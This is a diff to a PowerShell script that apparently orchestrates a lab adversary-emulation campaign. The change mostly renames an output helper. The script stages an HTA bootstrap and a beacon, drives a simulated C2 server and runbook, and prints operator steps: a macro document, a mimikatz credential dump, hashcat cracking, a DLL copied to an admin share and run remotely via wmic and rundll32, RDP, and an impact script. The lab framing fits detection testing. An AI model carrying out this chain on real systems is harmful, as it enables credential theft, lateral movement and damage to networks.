@@ -38,42 +38,42 @@ $C2 = "http://${C2Ip}:${C2Port}"
 $ledger = Join-Path $repo 'evidence/run-ledger'
 $logPath = Join-Path $repo 'c2sim.log'
 
-function H { param([string]$m) Write-Host $m -ForegroundColor Cyan }
+function Step { param([string]$m) Write-Host $m -ForegroundColor Cyan }
 function Wait-Key { Read-Host '   ... Enter de tiep tuc (Ctrl+C de dung)' | Out-Null }
 function Get-Phase3Token {
     ((Invoke-RestMethod "$C2/sessions") | Where-Object { $_.stage -eq 'phase3' } | Select-Object -First 1).token
 }
 
 function Start-Phase {
-    H '== Pre: config + servers =='
+    Step '== Pre: config + servers =='
     $cfg = Join-Path $repo "$Staging/config.ini"
     & (Join-Path $repo 'payloads/packaging/make_config.ps1') -RunId $RunId -C2Host $C2Ip -OutPath $cfg | Out-Null
     Copy-Item (Join-Path $repo 'payloads/hta/bootstrap.hta') (Join-Path $repo $Staging) -Force
     Copy-Item (Join-Path $repo 'payloads/beacon/c0015_beacon.ps1') (Join-Path $repo $Staging) -Force
     Copy-Item (Join-Path $repo 'payloads/config/c0015-phase7.example.ini') (Join-Path $repo "$Staging/config-phase7.ini") -Force
-    H "HOAN TAT BANG TAY: sua run_id trong $Staging\config-phase7.ini = $RunId"
-    & (Join-Path $repo 'payloads/packaging/launch_servers.ps1') -C2Ip $C2Ip -PublishDir (Join-Path $repo 'build/out') | Out-Null
-    H '== WS01 (MANUAL): stage_ws01.ps1 + install_macro_docm.ps1 + mo test.docm (Enable Content) =='
-    H 'Sau khi mo xong, chay -Action P1 / P2.'
+    Step "HOAN TAT BANG TAY: sua run_id trong $Staging\config-phase7.ini = $RunId"
+    & (Join-Path $repo 'payloads/packaging/launch_servers.ps1') -C2Ip $C2Ip -PublishDir 'build/out' | Out-Null
+    Step '== WS01 (MANUAL): stage_ws01.ps1 + install_macro_docm.ps1 + mo test.docm (Enable Content) =='
+    Step 'Sau khi mo xong, chay -Action P1 / P2.'
 }
 
 function Wait-Session {
-    H '== WaitSession: cho session 1 (phase3) =='
+    Step '== WaitSession: cho session 1 (phase3) =='
     $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
     $t = $null
     do {
         Start-Sleep 5
         try { $t = Get-Phase3Token } catch { }
     } until ($t -or (Get-Date) -gt $deadline)
-    if ($t) { H "SESSION1 TOKEN: $t" } else { throw 'Het time - chua thay session phase3 (mo test.docm chua?)' }
+    if ($t) { Step "SESSION1 TOKEN: $t" } else { throw 'Het time - chua thay session phase3 (mo test.docm chua?)' }
 }
 
 function Check-Phase1 {
-    H '== P1: verify phase 1 =='
+    Step '== P1: verify phase 1 =='
     $reg = Select-String -Path $logPath -Pattern 'register stage=phase3 host=WS01 .*ok=True' -ErrorAction SilentlyContinue
-    if ($reg) { H "REGISTER OK: $($reg.Line)" } else { H 'CHUA THAY register ok - mo test.docm tren WS01.' }
-    H 'Markers tren WS01 (kiem tra tay): b64-marker.txt, js-marker.txt, c0015-comparefor.jpg, dll-executed.txt'
-    H "Token: $(Get-Phase3Token)"
+    if ($reg) { Step "REGISTER OK: $($reg.Line)" } else { Step 'CHUA THAY register ok - mo test.docm tren WS01.' }
+    Step 'Markers tren WS01 (kiem tra tay): b64-marker.txt, js-marker.txt, c0015-comparefor.jpg, dll-executed.txt'
+    Step "Token: $(Get-Phase3Token)"
 }
 
 function New-ArtifactTemplates {
@@ -87,32 +87,32 @@ function New-ArtifactTemplates {
         $p = Join-Path $dir $_.Key
         if (-not (Test-Path $p)) { $_.Value | ConvertTo-Json -Depth 5 | Set-Content -Path $p -Encoding UTF8 }
     }
-    H "Artifact templates: $dir\*.json (fill TBD truoc khi artifact-new)."
+    Step "Artifact templates: $dir\*.json (fill TBD truoc khi artifact-new)."
 }
 
 function Invoke-Phase2 {
-    H '== P2: runbook phase2 (11 entries) =='
+    Step '== P2: runbook phase2 (11 entries) =='
     $t = Get-Phase3Token
     if (-not $t) { Wait-Session; $t = Get-Phase3Token }
     Invoke-RestMethod -Method Post -Uri "$C2/runbook?session=$t&name=c0015-phase2" | Out-Null
-    H 'Runbook enqueued. Cho beacon chay (11 OP-CMD)...'
+    Step 'Runbook enqueued. Cho beacon chay (11 OP-CMD)...'
     $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
     $s = $null
     do {
         Start-Sleep 5
         $s = (Invoke-RestMethod "$C2/sessions" | Where-Object { $_.token -eq $t })
     } until (($s.queue_len -eq 0 -and $s.tasks_done -ge 11) -or (Get-Date) -gt $deadline)
-    H ("Runbook: queue={0} tasks_done={1}" -f $s.queue_len, $s.tasks_done)
+    Step ("Runbook: queue={0} tasks_done={1}" -f $s.queue_len, $s.tasks_done)
     New-ArtifactTemplates
-    H '== Interactive steps (WS01) - lam roi Enter de tiep tuc =='
-    H ' S5 artifact  : pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Artifacts -RunId <RUN>  (ART-04-01)'
-    H ' S6           : ART-04-02 (art04_02.json da co template)'
-    H ' S7           : net use A/B/C (chay payloads/packaging/run_ws01_operator.ps1 -Step S7) - giu ket noi B'
-    H ' S7b          : mimikatz dump tren WS01 -> NTLM it.admin -> crack tren Kali (hashcat -m 1000) -> giu plaintext'
-    H ' S8a          : copy 143.dll + beacon + config-phase7 -> \\FS01\C$\C0015\'
-    H ' S8b          : runas it.admin "wmic /node:FS01 process call create rundll32 ..." (dung plaintext CRACKED)'
+    Step '== Interactive steps (WS01) - lam roi Enter de tiep tuc =='
+    Step ' S5 artifact  : pwsh -File payloads/packaging/run_campaign_orchestrator.ps1 -Action Artifacts -RunId <RUN>  (ART-04-01)'
+    Step ' S6           : ART-04-02 (art04_02.json da co template)'
+    Step ' S7           : net use A/B/C (chay payloads/packaging/run_ws01_operator.ps1 -Step S7) - giu ket noi B'
+    Step ' S7b          : mimikatz dump tren WS01 -> NTLM it.admin -> crack tren Kali (hashcat -m 1000) -> giu plaintext'
+    Step ' S8a          : copy 143.dll + beacon + config-phase7 -> \\FS01\C$\C0015\'
+    Step ' S8b          : runas it.admin "wmic /node:FS01 process call create rundll32 ..." (dung plaintext CRACKED)'
     Wait-Key
-    H '== Cho receipt ART-07-01 (session 2 tren FS01) =='
+    Step '== Cho receipt ART-07-01 (session 2 tren FS01) =='
     $deadline = (Get-Date).AddSeconds($TimeoutSeconds)
     $rc = $null
     do {
@@ -120,19 +120,19 @@ function Invoke-Phase2 {
         $rc = Get-ChildItem $ledger -Filter 'ART-07-01-*.json' -ErrorAction SilentlyContinue |
             Sort-Object LastWriteTime -Descending | Select-Object -First 1
     } until ($rc -or (Get-Date) -gt $deadline)
-    if ($rc) { H "RECEIPT OK: $($rc.Name)" } else { H 'Chua thay receipt - kiem tra FS01 callback (E3 :8080, E7 hash).' }
+    if ($rc) { Step "RECEIPT OK: $($rc.Name)" } else { Step 'Chua thay receipt - kiem tra FS01 callback (E3 :8080, E7 hash).' }
 }
 
 function Invoke-Phase3 {
-    H '== P3: guided phase 3 =='
-    H 'S10 (FS01 session2): doc corpus \\FS01\IT roi tren C2 host:'
-    H "   python scripts/lab_tools.py manifest-new <corpus_dir> $RunId -o stage\ws01\art08_01.json"
-    H "S11: sink chua co trong repo (p5_sink) -> muon chay can sink; offline: python scripts/lab_tools.py receipt-check <receipt> <manifest> <allowlist>"
-    H 'S12 (RDP): mstsc /v:FS01 (it.admin) - can DET-008 define'
-    H 'S13 (AnyDesk-like): manual - install portable app vao path dac biet; LSASS branch = fixtures/replay'
-    H "S14 (impact, FS01 co ban repo): pwsh -File .\c0015_impact.ps1 -Manifest <m> -Action Prepare|Run|Verify|Rollback|Verify"
-    H "S15: python scripts/lab_tools.py score <ground_truth> <reconstruction>"
-    H 'Cleanup: -Action Stop; xoa artifacts WS01/FS01; bat lai Defender.'
+    Step '== P3: guided phase 3 =='
+    Step 'S10 (FS01 session2): doc corpus \\FS01\IT roi tren C2 host:'
+    Step "   python scripts/lab_tools.py manifest-new <corpus_dir> $RunId -o stage\ws01\art08_01.json"
+    Step "S11: sink chua co trong repo (p5_sink) -> muon chay can sink; offline: python scripts/lab_tools.py receipt-check <receipt> <manifest> <allowlist>"
+    Step 'S12 (RDP): mstsc /v:FS01 (it.admin) - can DET-008 define'
+    Step 'S13 (AnyDesk-like): manual - install portable app vao path dac biet; LSASS branch = fixtures/replay'
+    Step "S14 (impact, FS01 co ban repo): pwsh -File .\c0015_impact.ps1 -Manifest <m> -Action Prepare|Run|Verify|Rollback|Verify"
+    Step "S15: python scripts/lab_tools.py score <ground_truth> <reconstruction>"
+    Step 'Cleanup: -Action Stop; xoa artifacts WS01/FS01; bat lai Defender.'
 }
 
 function Print-Artifacts {
@@ -146,7 +146,7 @@ ART-06-01 : python scripts/lab_tools.py artifact-new ART-06-01 $RunId 6 7 --payl
 
 function Stop-Servers {
     & (Join-Path $repo 'payloads/packaging/launch_servers.ps1') -Stop | Out-Null
-    H 'Servers stopped.'
+    Step 'Servers stopped.'
 }
 
 switch ($Action) {
